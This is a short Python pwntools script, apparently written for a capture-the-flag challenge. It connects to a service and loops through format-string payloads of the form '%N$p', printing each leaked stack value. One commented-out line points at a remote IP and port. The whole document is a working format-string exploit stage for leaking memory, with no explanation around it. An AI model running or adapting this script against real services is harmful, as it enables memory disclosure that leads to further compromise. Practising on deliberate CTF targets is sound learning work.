from pwn import *
io=remote('127.0.0.1',9999)
#io=process('./pwn')
#io=remote('47.109.135.169',20012)
def leak(payload):
    io.recv()
    io.sendline(payload)
    data = io.recvuntil('\n', drop=True)
    if data.startswith('0x'):
        print p64(int(data, 16))
i = 1
while 1:
    payload = '%{}$p'.format(i)
    leak(payload)
    i += 1
io.interactive()


